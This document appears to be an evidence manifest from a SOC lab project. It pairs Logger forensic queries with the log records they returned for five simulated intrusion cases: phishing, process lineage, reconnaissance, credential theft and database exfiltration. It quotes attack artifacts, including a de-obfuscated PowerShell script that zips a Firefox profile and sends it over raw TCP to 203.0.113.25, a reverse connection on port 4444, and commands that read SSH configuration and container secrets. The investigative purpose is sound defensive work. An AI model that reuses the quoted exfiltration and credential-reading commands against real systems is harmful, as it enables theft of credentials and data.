# Forensic Investigation & Query Evidence

This directory documents the empirical evidence proving the Logger query syntax, parsed CEF attributes, and investigative reasoning executed during the incident response case studies.

---

## Evidence Manifest: INV-001
* **Evidence ID**: `INV-001`
* **Investigation Target**: Postfix Mail Gateway Backtracking (Case 001)
* **Evidence Classification**: `CONTEXTUAL`
* **Source Reference**: `Báo cáo đề tài SOC.pdf`, Trang 91, 124.
* **Logger Forensic Query**:
  ```text
  deviceProduct="Postfix" AND destinationUserName="user01@soclab.test"
  ```
* **Raw Syslog Record Yield**:
  ```text
  Sep 17 14:14:30 MAIL01 postfix/smtp[1842]: 718FC8006A: to=<user01@soclab.test>, 
  relay=local, delay=0.12, delays=0.08/0.01/0/0.03, dsn=2.0.0, 
  status=sent (delivered to maildir)
  ```
* **Analytic Yield**: Ties the download event back to a specific inbound phishing email delivered under Postfix Queue ID `718FC8006A` with subject `"URGENT: Critical Security Update KB504991"`.

---

## Evidence Manifest: INV-002
* **Evidence ID**: `INV-002`
* **Investigation Target**: Parent-Child Process Lineage Tracing via Sysmon (Case 001)
* **Evidence Classification**: `DIRECT`
* **Source Reference**: `Báo cáo đề tài SOC.pdf`, Trang 62, 125.
* **Logger Forensic Query**:
  ```text
  deviceProduct="Microsoft-Windows-Sysmon" AND (deviceCustomString5="{ecec360d-d71c-6aab-3400-000000001800}" OR message CONTAINS "{ecec360d-d71c-6aab-3400-000000001800}")
  ```
* **Reconstructed Process Tree Yield**:
  ```text
  [ProcessGuid: {ecec360d-d6a1...1200}] C:\Windows\explorer.exe (PID 4812)
    └── [ProcessGuid: {ecec360d-d71c...1800}] C:\Windows\System32\mshta.exe (PID 6104)
          └── [ProcessGuid: {ecec360d-d71e...1800}] C:\Windows\System32\cmd.exe /c (PID 6220)
                └── [ProcessGuid: {ecec360d-d720...1800}] powershell.exe -enc ... (PID 6288)
                      └── [Sysmon Event ID 3] Connect 203.0.113.25:4444 (TCP Active)
  ```
* **Analytic Yield**: Defeats Process ID (PID) recycling; proves that the external network callback was directly spawned by the HTA script launched from Windows Explorer.

---

## Evidence Manifest: INV-003
* **Evidence ID**: `INV-003`
* **Investigation Target**: Post-Compromise Host Reconnaissance Sequence (Case 002)
* **Evidence Classification**: `DIRECT`
* **Source Reference**: `Báo cáo đề tài SOC.pdf`, Trang 95, 126.
* **Logger Forensic Query**:
  ```text
  deviceProduct="Microsoft-Windows-Sysmon" AND externalId=1 AND message CONTAINS "{ecec360d-d720-6aab-3600-000000001800}"
  ```
* **Extracted Command Sequence**:
  ```text
  1. T0 + 2m 45s: where.exe ssh
  2. T0 + 2m 58s: sc.exe query sshd
  3. T0 + 3m 06s: sc.exe query termservice
  4. T0 + 3m 18s: qwinsta.exe
  5. T0 + 3m 30s: netstat.exe -an
  6. T0 + 4m 10s: cmd.exe /c type C:\Users\admin\.ssh\config
  ```
* **Analytic Yield**: Discloses adversary's tactical focus on SSH and RDP; reveals discovery of target host `WEB01` (`10.10.34.13`) and username `thanh`.

---

## Evidence Manifest: INV-004
* **Evidence ID**: `INV-004`
* **Investigation Target**: In-Memory Script De-Obfuscation & Raw Socket Exfil (Case 003)
* **Evidence Classification**: `DIRECT`
* **Source Reference**: `Báo cáo đề tài SOC.pdf`, Trang 96–97, 126.
* **Logger Forensic Query**:
  ```text
  deviceProduct="Microsoft-Windows-PowerShell" AND externalId=4104 AND deviceHostName="IT-ADMIN"
  ```
* **De-Obfuscated ScriptBlock 4104 Code Yield**:
  ```powershell
  # Staging Phase:
  Compress-Archive -Path "C:\Users\Public\firefox_profile\*" -DestinationPath "C:\Users\Public\firefox_profile.zip" -Force

  # Exfiltration Phase:
  $client = New-Object System.Net.Sockets.TcpClient("203.0.113.25", 9999);
  $stream = $client.GetStream();
  $bytes = [System.IO.File]::ReadAllBytes("C:\Users\Public\firefox_profile.zip");
  $stream.Write($bytes, 0, $bytes.Length);
  $stream.Close(); $client.Close();
  ```
* **Analytic Yield**: Proves unencrypted raw TCP socket transmission of stolen browser credential store directly to external port 9999.

---

## Evidence Manifest: INV-005
* **Evidence ID**: `INV-005`
* **Investigation Target**: Linux Host Authentication & SSH Lateral Traversal (Case 004)
* **Evidence Classification**: `DIRECT`
* **Source Reference**: `Báo cáo đề tài SOC.pdf`, Trang 100, 127.
* **Logger Forensic Query**:
  ```text
  deviceProduct="Linux Syslog" AND deviceHostName="WEB01" AND message CONTAINS "Accepted password"
  ```
* **Auth Log Record Yield**:
  ```text
  Sep 17 14:31:45 WEB01 sshd[9124]: Accepted password for thanh from 10.10.35.18 port 48122 ssh2
  ```
* **Analytic Yield**: Corroborates that stolen credentials for user `thanh` were used to access `WEB01` via the Ligolo-ng tunnel running on `IT-ADMIN01`.

---

## Evidence Manifest: INV-006
* **Evidence ID**: `INV-006`
* **Investigation Target**: Privileged Container Credential Scraping (Case 004)
* **Evidence Classification**: `DIRECT`
* **Source Reference**: `Báo cáo đề tài SOC.pdf`, Trang 102, 127.
* **Logger Forensic Query**:
  ```text
  deviceProduct="WEB01 Web Stack" AND message CONTAINS "docker exec"
  ```
* **Linux Auditd Execve Record Yield**:
  ```text
  type=EXECVE msg=audit(1726558350.412:891): argc=6 a0="sudo" a1="docker" a2="exec" 
  a3="-it" a4="hrms-backend-1" a5="cat sites/hrms.soclab.test/site_config.json"
  ```
* **Analytic Yield**: Proves abuse of passwordless sudo permissions on Docker to extract production database secrets from container mounts.

---

## Evidence Manifest: INV-007
* **Evidence ID**: `INV-007`
* **Investigation Target**: MariaDB Database Dump Audit (Case 004)
* **Evidence Classification**: `DIRECT`
* **Source Reference**: `Báo cáo đề tài SOC.pdf`, Trang 104, 128.
* **Logger Forensic Query**:
  ```text
  deviceProduct="MariaDB Server Audit" AND sourceAddress=10.10.34.13 AND (deviceCustomString3 CONTAINS "SHOW DATABASES" OR deviceCustomString3 CONTAINS "tabEmployee")
  ```
* **Database Audit Record Yield**:
  ```text
  20260917 14:34:05,DB01,_6f9beb897020ebe5,10.10.34.13,142,12,QUERY,'SHOW DATABASES',0
  20260917 14:34:06,DB01,_6f9beb897020ebe5,10.10.34.13,142,18,QUERY,'SELECT /*!40001 SQL_NO_CACHE */ * FROM `tabEmployee`',0
  ```
* **Analytic Yield**: Confirms that database user `_6f9beb897020ebe5` dumped the entire corporate employee table via `mysqldump` from `WEB01`.

---

## Evidence Manifest: INV-008
* **Evidence ID**: `INV-008`
* **Investigation Target**: Netcat DMZ Data Exfiltration Volumetrics (Case 005)
* **Evidence Classification**: `DIRECT`
* **Source Reference**: `Báo cáo đề tài SOC.pdf`, Trang 106, 128.
* **Logger Forensic Query**:
  ```text
  deviceProduct="Suricata IDS IPS" AND deviceCustomNumber1=1101021 AND sourceAddress=10.10.34.13
  ```
* **Volumetric Flow Calculation**:
  * Source: `10.10.34.13:54210` $\rightarrow$ Destination: `203.0.113.25:9999`
  * Byte Counter: `bytes_toserver = 4,194,304 bytes` (4.19 MB)
  * Flow Duration: `3.42 seconds`
  * Transfer Velocity: `1.22 MB/second`
* **Analytic Yield**: Conclusively validates the exfiltration of the 4.1 MB database dump archive staged at `/tmp/_6f9beb897020ebe5.sql.gz`.
